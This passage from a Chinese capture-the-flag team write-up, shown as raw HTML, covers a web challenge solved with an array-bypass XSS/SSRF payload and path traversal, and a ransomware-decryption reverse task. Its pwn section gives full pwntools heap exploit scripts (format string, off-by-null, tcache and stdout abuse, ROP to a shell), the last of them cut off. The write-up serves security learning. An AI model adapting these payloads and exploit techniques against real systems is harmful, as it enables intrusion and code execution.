punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>files<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    res<span class="token punctuation">.</span><span class="token function">cookie</span><span class="token punctuation">(</span><span class="token string">'token'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span>username<span class="token operator">:</span> token<span class="token punctuation">.</span>username<span class="token punctuation">,</span> files<span class="token operator">:</span> files<span class="token punctuation">,</span> isAdmin<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> signed<span class="token operator">:</span> <span class="token boolean">true</span> <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">&#125;</span></code></pre><p>post方法可以看到ban掉了<code>&lt;</code>/<code>script</code>/<code>&gt;</code>等，从出题人的思路讲，可能是要打xss</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> <span class="token punctuation">&#123;</span> content <span class="token punctuation">&#125;</span> <span class="token operator">=</span> req<span class="token punctuation">.</span>body<span class="token punctuation">;</span><span class="token keyword">if</span> <span class="token punctuation">(</span> content <span class="token operator">==</span> <span class="token string">''</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'/'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'script'</span><span class="token punctuation">)</span> <span class="token operator">||</span> content<span class="token punctuation">.</span><span class="token function">includes</span><span class="token punctuation">(</span><span class="token string">'on'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token comment">// even admin can't be trusted right ? :)  </span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">render</span><span class="token punctuation">(</span><span class="token string">'admin'</span><span class="token punctuation">,</span> <span class="token punctuation">&#123;</span> error<span class="token operator">:</span> <span class="token string">'Forbidden word 🤬'</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>使用了html-pdf依赖用于生成pdf，然后保存文件到xx.pdf</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">const</span> filename <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span><span class="token function">uuid</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">.pdf</span><span class="token template-punctuation string">`</span></span></code></pre><p>在<code>/api/files</code>路由下带参数可以加一条log，带<code>/sumid</code>可以访问文件，可以看到superuser被ban了 </p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">if</span> <span class="token punctuation">(</span>token<span class="token punctuation">.</span>username <span class="token operator">==</span> <span class="token string">'superuser'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Superuser is disabled now'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>   <span class="token punctuation">&#125;</span></code></pre><p>但是关键点在于读取到文件后会进入模版渲染，加上前面ban了xss的东西，推测就是打xss了</p><pre class="language-js" data-language="js"><code class="language-js"><span class="token keyword">let</span> filename <span class="token operator">=</span> <span class="token keyword">await</span> <span class="token constant">DB</span><span class="token punctuation">.</span><span class="token function">getFile</span><span class="token punctuation">(</span>token<span class="token punctuation">.</span>username<span class="token punctuation">,</span> req<span class="token punctuation">.</span>params<span class="token punctuation">.</span>id<span class="token punctuation">)</span><span class="token keyword">if</span> <span class="token punctuation">(</span>fs<span class="token punctuation">.</span><span class="token function">existsSync</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token keyword">await</span> <span class="token function">readFile</span><span class="token punctuation">(</span>path<span class="token punctuation">.</span><span class="token function">join</span><span class="token punctuation">(</span>__dirname <span class="token punctuation">,</span> <span class="token string">"../files/"</span><span class="token punctuation">,</span> filename<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span> <span class="token keyword">else</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'No such file!'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></code></pre><p>由于html-pdf 用到了phanthomjs渲染，因此存在ssrf。我们可以使用数组绕过<code>.includes(xxx)</code>的检测。并插入ssrf的内容</p><p>Payload:</p><pre class="language-none"><code class="language-none">content[]&#x3D;&lt;script&gt;location.href&#x3D;&quot;http:&#x2F;&#x2F;127.0.0.1:8888&#x2F;api&#x2F;files?username&#x3D;admin&amp;filename&#x3D;..&#x2F;files&#x2F;flag&amp;checksum&#x3D;be5a14a8e504a66979f6938338b0662c&quot;;&lt;&#x2F;script&gt;</code></pre><p>容器打完后会崩，试了几次，然后访问下<code>/admin</code>路由 </p><p>直接去访问文件，<code>./api/files/be5a14a8e504a66979f6938338b0662c</code>，得到flag</p><hr><h2 id="Web总结"><a href="#Web总结" class="headerlink" title="Web总结"></a>Web总结</h2><p>觉得这是发挥不错的一场比赛了，虽然题目很简单，但是还是学到了很多，尤其是安全检测，自己独立凭感觉解出来题目自信心也是upup。还有层层穿透，很有趣的内网渗透题目，很简单，但是给我敲开了这扇大门，感觉很有兴趣，以后可以多研究一下。</p><p>以下是本队的WP，虽然成绩不太行，但是尽力就好。</p><hr><h2 id="Reverse"><a href="#Reverse" class="headerlink" title="Reverse"></a>Reverse</h2><h3 id="勒索解密"><a href="#勒索解密" class="headerlink" title="勒索解密"></a>勒索解密</h3><p>32位exe程序，要知道程序加密文件的流程，</p><p>看到了这个，Microsoft Enhanced RSA and AES Cryptographic Provider</p>猜测先把key+timestamp联系到了一起，然后sha256加密变成那个key，再拿去aes加密。<img src="/article/2021xyb/3202085600-229394217-57394DB0558F49AAB782959EC5A93100.JPG" class="" title="3202085600-229394217-57394DB0558F49AAB782959EC5A93100" loading="lazy"><img src="/article/2021xyb/3202085600-886959209-9385D62446713B8751AEFB402591DB09.JPG" class="" title="3202085600-886959209-9385D62446713B8751AEFB402591DB09" loading="lazy"><p>和时间戳连着 然后给key</p><img src="/article/2021xyb/3202085600-201622791-5AC8865E89504CA44AD22B2BEE9B0612.JPG" class="" title="3202085600-201622791-5AC8865E89504CA44AD22B2BEE9B0612" loading="lazy"><p>来了一下0x800C这种加密，然后得到一个key，再拿这个key去aes加密文件</p><img src="/article/2021xyb/3202085600-1838268119-6D44CB41D7988685E018363677E2C6D9.JPG" class="" title="3202085600-1838268119-6D44CB41D7988685E018363677E2C6D9" loading="lazy"><p>AES：660E</p><img src="/article/2021xyb/3202085600-1920708629-16E549D4945DC54A0B07B4FB3F3591D3.JPG" class="" title="3202085600-1920708629-16E549D4945DC54A0B07B4FB3F3591D3" loading="lazy"><p>感觉那个rsa只是用来校验完整性</p><p>根据加密文件的时间戳，修正为UTC+0时间，可知中间的time应为0x611a1105</p><pre class="language-none"><code class="language-none">import base64from Crypto.Cipher import AESfrom Crypto import Randomimport hashlibimport osimport base64def encrypt(data, password):    bs &#x3D; AES.block_size    pad &#x3D; lambda s: s + (bs - len(s) % bs) * chr(bs - len(s) % bs)    cipher &#x3D; AES.new(password)    data &#x3D; cipher.encrypt(pad(data))    return (data)    if __name__ &#x3D;&#x3D; &#39;__main__&#39;:    key &#x3D; bytearray.fromhex(&#39;b22fc60e4fd4544b05111a6121e7b18e&#39;)    key &#x3D; hashlib.sha256(key).hexdigest()    key &#x3D; bytes.fromhex(key)[:16]    iv &#x3D; b&#39;\x00&#39;*16    cipher &#x3D; AES.new(key, AES.MODE_CBC, iv )    f &#x3D; open(&#39;flag.bmp.ctf_crypter&#39;, &#39;rb&#39;)    data &#x3D; f.read()[:-0x80-4]    de &#x3D; cipher.decrypt(data)    d &#x3D; open(&#39;daidai.bmp&#39;,&#39;wb&#39;)    d.write(de)    d.close()    f.close()</code></pre><img src="/article/2021xyb/1629625133(1).png" class="" title="1629625133(1)" loading="lazy"><h3 id="Rev-Dizzy"><a href="#Rev-Dizzy" class="headerlink" title="Rev_Dizzy"></a>Rev_Dizzy</h3><p>由于数据太大超过文档限制，这里不便贴出，两个puts直接解决，签到题。直接逆序文件，加减号互换，跑一下出flag。</p><img src="/article/2021xyb/1629629205(1).png" class="" title="1629629205(1)" loading="lazy"><hr><h2 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h2><h3 id="note"><a href="#note" class="headerlink" title="note"></a>note</h3><p>通过scanf的格式化字符串漏洞修改TOPCHUNK的size并申请大于topchunk的堆块使其进入unsortedbin中，在申请回来时因为没有零截断所以可以直接打印出mainarena地址，进而获得libc基地址，通过计算偏移后可以构建system(“/bin/sh”)的ROP链并获取shell</p><p>exp：</p><pre class="language-none"><code class="language-none">from pwn import *import timecontext.log_level &#x3D; &#39;debug&#39;context.arch &#x3D; &#39;amd64&#39;def menu(index):p.sendlineafter(&#39;choice: &#39;, str(index))def add(size, content):menu(1)p.sendlineafter(&#39;size: &#39;, str(size))p.sendlineafter(&#39;content: &#39;, content)def say(say1, say2):menu(2)p.sendlineafter(&#39;say ? &#39;, say1)p.sendlineafter(&#39;? &#39;, say2)def debug():gdb.attach(p)p &#x3D; process(&#39;.&#x2F;pwn1&#39;)# p &#x3D; remote(&#39;47.104.70.90&#39;,&#39;25315&#39;)libc &#x3D; ELF(&#39;libc-2.23.so&#39;)rbp_rip &#x3D; &#39;%17$s\x00&#39;# gdb.attach(p,&#39;b *$rebase(0x1235)&#39;)add(0x10,&#39;lby&#39;)p.recvuntil(&#39;addr: &#39;)heap_addr &#x3D; int(p.recvline().replace(&#39;\n&#39;,&#39;&#39;),16)success(&#39;heap: &#39;+hex(heap_addr))pl1 &#x3D; &#39;%7$s&#39;+&#39;aaaa&#39;+p64(heap_addr)pl2 &#x3D; &#39;a&#39;*0x18+p64(0xfe1)say(pl1, pl2)for i in range(24):add(0x90,&#39;a&#39;*0x90)add(0xd0,&#39;a&#39;*0xd0)add(0x10, &#39;a&#39;*8)menu(3)p.recvuntil(&#39;content:aaaaaaaa\n&#39;)malloc_hook &#x3D; u64((&#39;\x00&#39;+p.recv(5)).ljust(8,&#39;\x00&#39;))-224-0x10libc_base &#x3D; malloc_hook-libc.sym[&#39;__malloc_hook&#39;]system &#x3D; libc_base+libc.sym[&#39;system&#39;]sh &#x3D; libc_base + libc.search(&#39;&#x2F;bin&#x2F;sh\x00&#39;).next()prdi_ret &#x3D; libc_base+libc.search(asm(&quot;pop rdi\nret&quot;)).next()success(hex(malloc_hook))pl3 &#x3D; p64(prdi_ret)+p64(sh)+p64(system)say(&#39;%17$s&#39;,&#39;a&#39;*8+pl3)p.interactive()</code></pre><h3 id="PassWordBox-FreeVersion"><a href="#PassWordBox-FreeVersion" class="headerlink" title="PassWordBox_FreeVersion"></a>PassWordBox_FreeVersion</h3><p>fgets处溢出一字节，构成off by null漏洞，输入的内容会被加密所以要进行逆向分析，确保我们在堆上的数据是正常的</p><p>观察show函数，不难发现其在show之前又执行了一次加密函数，并且创建堆块的时候会直接输出密钥加密后的内容，将其与我们输入的内容进行相异或即可得到随机值</p><p>解决了加密的问题，然后我们就可以利用前面提到的offbynull漏洞进行利用，构造堆重叠已经堆块复用的情况，通过让堆块进入unsortedbin以此来泄露libc基地址，最后再通过往free_hook中写入onegadget来获取shell</p><pre class="language-none"><code class="language-none">from pwn import *import timedef add(id,size,content):    p.sendlineafter(&quot;Input Your Choice:\n&quot;,str(1))    p.sendafter(&quot;Save:&quot;,str(id))    p.sendlineafter(&quot;Pwd:&quot;,str(size))    p.sendafter(&quot;Pwd:&quot;,content)def show(id):    p.sendlineafter(&quot;Choice:\n&quot;,str(3))    p.sendlineafter(&quot;Check:\n&quot;,str(id))def delete(id):    p.sendlineafter(&quot;Choice:\n&quot;,str(4))    p.sendlineafter(&quot;Delete:\n&quot;,str(id))def edit(id,data):    p.sendlineafter(&quot;Choice:\n&quot;,str(2))    p.sendline(str(id))    p.sendline(str(data))p&#x3D;process(&#39;.&#x2F;pwdFree&#39;)libc &#x3D; ELF(&quot;libc.so.6&quot;)add(0,0xf8,&#39;\n&#39;)p.recvuntil(&#39;D:&#39;)key&#x3D;u64(p.recv(8))rand&#x3D;key^0xaadd(1,0xf8,&#39;\n&#39;)add(2,0xf8,&#39;\n&#39;)for i in range(7):    add(i+3,0xf0,&#39;\n&#39;)  #3--9 full tcfor i in range(6):  #3-9 full tc    delete(i+3)delete(1)delete(0)num&#x3D;0x200^randpayload&#x3D;b&#39;c&#39;*0xf0+p64(num)add(0,0xf8,payload)delete(9)delete(2)for i in range(8):    add(1, 0xf8, &#39;\n&#39;)show(0)p.recvuntil(&#39;Pwd is: &#39;)key&#x3D;u64(p.recv(8))l&#x3D;key^randlibcbase&#x3D;l-0x3ebca0add(9,0xf8,&#39;\n&#39;)delete(1)delete(2)delete(0)free&#x3D;libcbase+0x3ed8e8edit(9,p64(free))add(1,0xf8,&#39;\n&#39;)one&#x3D;libcbase+0x4f432system&#x3D;libcbase+0x04f550system&#x3D;one^randpayload&#x3D;p64(system)add(2,0xf8,payload+b&#39;\n&#39;)delete(1)p.interactive()</code></pre><h3 id="Lemon"><a href="#Lemon" class="headerlink" title="Lemon"></a>Lemon</h3><p>主要问题是2.26版本下, 未控制好指针导致任意写</p><p>数据结构如下:</p><p> lemon_name:</p><p>lemon_content:</p><p>主要可利用的函数是color:</p><p>这里的buf是指lemon_name结构, 所以可以控制指针lemon_addr的指向了, 因为只能用一次所以想控制整个tcache结构</p><p>其它一点可利用的函数:</p><p>开头的一次welcome:</p><p>虽然是有rand, 但无随机数种子, 所以是固定值, z3一把🔒!</p><p>eat函数: 可以打印chunkaddr第四字节, 用于配合后面分配堆块</p><p>整体思路: 利用color控制lemon_addr指向tcache的地址, 然后用一次释放一次可以做到一直控制tcache, 第一次使用可以设置tcache某些块数量达到7, 从而生成unsortedbin, 虽然无法直接打印, 但是使用particular write+爆破可以让chunk申请到_IO_2_1_stdout中, 然后泄露libc, 之后再以类似操作用environ打印出栈基址, 配合之前的泄露获取stack地址, 最后再用io即可打印出flag</p><p>难点:</p><p>多了个类似ptmalloc的检测在分配完成之后, 导致使用free_hook等充满难度:</p><p>exp:</p><pre class="language-python" data-language="python"><code class="language-python"><span class="token comment">#!/usr/bin/env python</span><span class="token comment"># coding=utf-8</span><span class="token keyword">from</span> pwn <span class="token keyword">import</span> <span class="token operator">*</span><span class="token keyword">from</span> z3 <span class="token keyword">import</span> <span class="token operator">*</span>io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./lemon_pwn'</span><span class="token punctuation">)</span>libc <span class="token operator">=</span> ELF<span class="token punctuation">(</span><span class="token string">'./libc/libc-2.26.so'</span><span class="token punctuation">)</span>context<span class="token punctuation">.</span>log_level <span class="token operator">=</span> <span class="token string">'debug'</span><span class="token keyword">def</span> <span class="token function">resolve</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    x<span class="token operator">=</span>BitVec<span class="token punctuation">(</span><span class="token string">'x'</span><span class="token punctuation">,</span> <span class="token number">33</span><span class="token punctuation">)</span>    x<span class="token operator">=</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token operator">^</span>x<span class="token operator">|</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token number">3</span><span class="token operator">*</span>x<span class="token operator">-</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token number">0xffffffff</span><span class="token punctuation">)</span><span class="token operator">&amp;</span><span class="token punctuation">(</span>x<span class="token operator">/</span><span class="token punctuation">(</span>x<span class="token operator">>></span><span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    s<span class="token operator">=</span>Solver<span class="token punctuation">(</span><span class="token punctuation">)</span>    s<span class="token punctuation">.</span>add<span class="token punctuation">(</span>x<span class="token operator">^</span><span class="token number">0x6b8b4567</span><span class="token operator">==</span><span class="token number">0x13b6db38</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> s<span class="token punctuation">.</span>check<span class="token punctuation">(</span><span class="token punctuation">)</span>    result<span class="token operator">=</span>s<span class="token punctuation">.</span>model<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">print</span> result<span class="token keyword">def</span> <span class="token function">add</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>name<span class="token punctuation">,</span>length<span class="token punctuation">,</span>context<span class="token operator">=</span><span class="token string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'1'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'name your lemon: \n'</span><span class="token punctuation">,</span>name<span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'length of message for you lemon: \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>length<span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> length <span class="token operator">&lt;=</span> <span class="token number">0x400</span><span class="token punctuation">:</span>        io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'message: \n'</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">eat</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'2'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">throw</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">:</span>     io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'3'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">color</span><span class="token punctuation">(</span>index<span class="token punctuation">,</span>context<span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'choice >>> '</span><span class="token punctuation">,</span><span class="token string">'4'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'index of your lemon  : \n'</span><span class="token punctuation">,</span><span class="token builtin">str</span><span class="token punctuation">(</span>index<span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendafter<span class="token punctuation">(</span><span class="token string">'draw and color!\n'</span><span class="token punctuation">,</span>context<span class="token punctuation">)</span>       <span class="token keyword">def</span> <span class="token function">exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">'me?\n'</span><span class="token punctuation">,</span><span class="token string">'yes'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendlineafter<span class="token punctuation">(</span><span class="token string">' number: \n'</span><span class="token punctuation">,</span>p32<span class="token punctuation">(</span><span class="token number">0x4a46bd98</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'first: \n'</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span><span class="token string">'/bin/sh'</span><span class="token punctuation">)</span>            add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'wwww\n'</span><span class="token punctuation">,</span><span class="token number">0x30</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x90</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'wwww\n'</span><span class="token punctuation">,</span><span class="token number">0x20</span><span class="token punctuation">)</span>    <span class="token comment">#add(3,'a\n',944,'a\n')</span>    <span class="token comment">#add(3,'a\n',16,'a\n')</span>    eat<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'eat eat eat '</span><span class="token punctuation">)</span>    addr<span class="token operator">=</span><span class="token builtin">int</span><span class="token punctuation">(</span>io<span class="token punctuation">.</span>recv<span class="token punctuation">(</span><span class="token number">5</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>addr<span class="token punctuation">)</span><span class="token punctuation">)</span>    color<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token operator">*</span><span class="token number">0x10</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">0x40</span><span class="token punctuation">)</span><span class="token operator">+</span>p32<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>addr<span class="token operator">-</span><span class="token number">0x250</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">''' control all tc'''</span>    throw<span class="token punctuation">(</span><span class="token number">3</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">7</span><span class="token punctuation">)</span><span class="token operator">+</span>p8<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">0x37</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p16<span class="token punctuation">(</span>addr<span class="token operator">+</span><span class="token number">0xd0</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x60</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a\n'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p16<span class="token punctuation">(</span><span class="token number">0x86ed</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    <span class="token triple-quoted-string string">'''boom!'''</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a\n'</span><span class="token punctuation">,</span><span class="token number">96</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span><span class="token string">'\x88'</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io)</span>    stdin<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    libc_base <span class="token operator">=</span> stdin<span class="token operator">-</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdin_'</span><span class="token punctuation">]</span>    stdout <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_IO_2_1_stdout_'</span><span class="token punctuation">]</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>    environ <span class="token operator">=</span> libc_base<span class="token operator">+</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">'_environ'</span><span class="token punctuation">]</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">0x240</span><span class="token punctuation">,</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">13</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>stdout<span class="token operator">-</span><span class="token number">0x33</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    <span class="token comment">#gdb.attach(io, '''b *$rebase(0x1106)''')</span>    add<span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">,</span><span class="token number">104</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token operator">*</span><span class="token number">0x33</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0xfbad1887</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token operator">*</span><span class="token number">3</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span>environ<span class="token operator">+</span><span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    stack<span class="token operator">=</span>u64<span class="token punctuation">(</span>io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'\x7f'</span><span class="token punctuation">)</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">6</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">8</span><span class="token punctuation">,</span><span class="token string">'\x00'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">0x180</span>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>stack<span class="token punctuation">)</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token string">'b'</span><span class="token punctuation">,</span><span class="token number">48</span><span class="token punctuation">,</span><span class="token string">'a'</span><span class="token punctuation">)</span>    throw<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span>    add<span class="token punctuation">(</span><span class="token number">1</span><span class="token 